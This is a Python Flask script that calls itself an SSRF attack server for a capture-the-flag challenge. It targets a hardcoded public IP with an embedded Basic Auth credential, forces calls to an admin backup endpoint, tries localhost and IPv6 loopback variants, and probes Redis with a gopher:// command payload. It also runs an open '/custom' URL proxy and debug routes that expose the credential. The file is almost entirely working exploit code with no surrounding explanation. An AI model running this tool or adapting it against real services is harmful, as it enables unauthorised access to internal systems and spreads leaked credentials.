#!/usr/bin/env python3
"""
SSRF Server for CTF - Deploy on external server
This server receives SSRF requests and makes proper authenticated requests to the admin endpoint
"""

from flask import Flask, request, jsonify, Response
import requests
import json
import logging
import os
from datetime import datetime

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Configuration - Update these based on your CTF target
TARGET_HOST = "15.206.47.5:5000"  # The actual CTF server
ADMIN_ENDPOINT = f"http://{TARGET_HOST}/api/admin/backup/generate"
BASIC_AUTH = "YXBpLWFkbWluOkFwaU9ubHlCYXNpY1Rva2Vu"  # api-admin:ApiOnlyBasicToken
USER_ID = "f2f96855-8c05-4599-a98c-f7f2fd718fa2"

# Alternative endpoints to try
REDIS_ENDPOINT = f"http://{TARGET_HOST}:6379/"
INTERNAL_ENDPOINTS = [
    f"http://127.0.0.1:5000/api/admin/backup/generate",
    f"http://localhost:5000/api/admin/backup/generate", 
    f"http://0.0.0.0:5000/api/admin/backup/generate",
    f"http://[::1]:5000/api/admin/backup/generate"
]

# Store requests for debugging
request_log = []

def log_request(req):
    """Log incoming requests for debugging"""
    log_entry = {
        "timestamp": datetime.now().isoformat(),
        "method": req.method,
        "url": req.url,
        "remote_addr": req.remote_addr,
        "user_agent": req.headers.get("User-Agent", "Unknown"),
        "query_params": dict(req.args),
        "headers": dict(req.headers)
    }
    request_log.append(log_entry)
    logger.info(f"Received request: {req.method} {req.url} from {req.remote_addr}")
    return log_entry

def make_request_to_target(target_url, method="POST", data=None, headers=None):
    """Make request to target endpoint"""
    try:
        default_headers = {
            "Authorization": f"Basic {BASIC_AUTH}",
            "Content-Type": "application/json",
            "Accept": "application/json",
            "User-Agent": "SSRF-Proxy/1.0"
        }
        
        if headers:
            default_headers.update(headers)
        
        if not data and method == "POST":
            data = {"user_id": USER_ID}
        
        logger.info(f"Making {method} request to: {target_url}")
        logger.info(f"Headers: {default_headers}")
        logger.info(f"Data: {data}")
        
        if method == "GET":
            response = requests.get(
                target_url,
                headers=default_headers,
                timeout=15,
                allow_redirects=True
            )
        else:
            response = requests.post(
                target_url,
                json=data,
                headers=default_headers,
                timeout=15,
                allow_redirects=True
            )
        
        logger.info(f"Target response status: {response.status_code}")
        logger.info(f"Target response headers: {dict(response.headers)}")
        logger.info(f"Target response body: {response.text[:1000]}...")
        
        return {
            "success": True,
            "status_code": response.status_code,
            "headers": dict(response.headers),
            "body": response.text,
            "timestamp": datetime.now().isoformat(),
            "target_url": target_url
        }
        
    except requests.exceptions.RequestException as e:
        logger.error(f"Request to {target_url} failed: {str(e)}")
        return {
            "success": False,
            "error": str(e),
            "timestamp": datetime.now().isoformat(),
            "target_url": target_url
        }

@app.route('/')
def root():
    """Main endpoint - this is where the SSRF will hit"""
    log_request(request)
    
    # Check if specific target is requested
    target = request.args.get('target', ADMIN_ENDPOINT)
    method = request.args.get('method', 'POST')
    
    # Make the request to target
    result = make_request_to_target(target, method)
    
    if result["success"]:
        # Return the target response with debug info
        response_text = f"""SSRF Request Success!
Target: {result['target_url']}
Status: {result['status_code']}
Timestamp: {result['timestamp']}

Response Body:
{result['body']}

=== Debug Info ===
User ID: {USER_ID}
Method: {method}
Request Headers Used: Authorization: Basic {BASIC_AUTH}
"""
        return Response(response_text, 
                       status=result['status_code'],
                       mimetype='text/plain')
    else:
        error_text = f"""SSRF Request Failed!
Target: {result['target_url']}
Error: {result['error']}
Timestamp: {result['timestamp']}
"""
        return Response(error_text, status=500, mimetype='text/plain')

@app.route('/admin')
def admin():
    """Direct admin endpoint proxy"""
    log_request(request)
    result = make_request_to_target(ADMIN_ENDPOINT)
    
    if result["success"]:
        return Response(result["body"], 
                       status=result["status_code"], 
                       mimetype='application/json')
    else:
        return jsonify(result), 500

@app.route('/try-all')
def try_all_endpoints():
    """Try all possible internal endpoints"""
    log_request(request)
    results = []
    
    # Try main admin endpoint
    result = make_request_to_target(ADMIN_ENDPOINT)
    results.append({"endpoint": ADMIN_ENDPOINT, "result": result})
    
    # Try internal variations
    for endpoint in INTERNAL_ENDPOINTS:
        result = make_request_to_target(endpoint)
        results.append({"endpoint": endpoint, "result": result})
    
    # Find successful responses
    successful = [r for r in results if r["result"]["success"]]
    
    if successful:
        best_result = successful[0]["result"]
        response_text = f"""Found Working Endpoint!
Endpoint: {successful[0]['endpoint']}
Status: {best_result['status_code']}

Response:
{best_result['body']}

=== All Attempts ===
"""
        for r in results:
            status = "SUCCESS" if r["result"]["success"] else "FAILED"
            response_text += f"{r['endpoint']}: {status}\n"
        
        return Response(response_text, mimetype='text/plain')
    else:
        return jsonify({"error": "All endpoints failed", "attempts": results}), 500

@app.route('/redis')
def redis_proxy():
    """Try to access Redis through the target"""
    log_request(request)
    
    # Try different Redis access methods
    redis_urls = [
        f"http://127.0.0.1:6379/",
        f"http://localhost:6379/", 
        f"http://0.0.0.0:6379/",
        f"http://redis:6379/",
        f"gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a"
    ]
    
    results = []
    for url in redis_urls:
        result = make_request_to_target(url, method="GET")
        results.append({"url": url, "result": result})
        
        if result["success"]:
            return Response(f"Redis Access Success!\nURL: {url}\nResponse:\n{result['body']}", 
                          mimetype='text/plain')
    
    return jsonify({"error": "Redis access failed", "attempts": results}), 500

@app.route('/custom')
def custom():
    """Custom endpoint with URL parameter"""
    log_request(request)
    
    target_url = request.args.get('url')
    if not target_url:
        return jsonify({"error": "Missing 'url' parameter"}), 400
    
    method = request.args.get('method', 'GET')
    result = make_request_to_target(target_url, method)
    
    if result["success"]:
        return Response(f"Custom Request Success!\nTarget: {target_url}\nResponse:\n{result['body']}", 
                       mimetype='text/plain')
    else:
        return jsonify(result), 500

@app.route('/test')
def test():
    """Test endpoint to verify server is working"""
    log_request(request)
    return jsonify({
        "status": "Server is working!",
        "timestamp": datetime.now().isoformat(),
        "config": {
            "admin_endpoint": ADMIN_ENDPOINT,
            "user_id": USER_ID,
            "target_host": TARGET_HOST,
            "has_auth": bool(BASIC_AUTH)
        },
        "request_count": len(request_log),
        "endpoints": {
            "main": "/",
            "admin": "/admin", 
            "try_all": "/try-all",
            "redis": "/redis",
            "custom": "/custom?url=TARGET_URL&method=GET",
            "logs": "/logs",
            "debug": "/debug"
        }
    })

@app.route('/logs')
def logs():
    """Debug endpoint to view request logs"""
    return jsonify({
        "total_requests": len(request_log),
        "requests": request_log[-20:]  # Last 20 requests
    })

@app.route('/debug')
def debug():
    """Debug endpoint with detailed information"""
    log_request(request)
    
    return jsonify({
        "server_info": {
            "status": "running",
            "timestamp": datetime.now().isoformat(),
            "request_count": len(request_log)
        },
        "config": {
            "target_host": TARGET_HOST,
            "admin_endpoint": ADMIN_ENDPOINT,
            "user_id": USER_ID,
            "basic_auth": BASIC_AUTH
        },
        "recent_requests": request_log[-10:] if request_log else []
    })

@app.route('/health')
def health():
    """Health check endpoint"""
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

# Handle all HTTP methods for root
@app.route('/', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
def handle_all_methods():
    return root()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
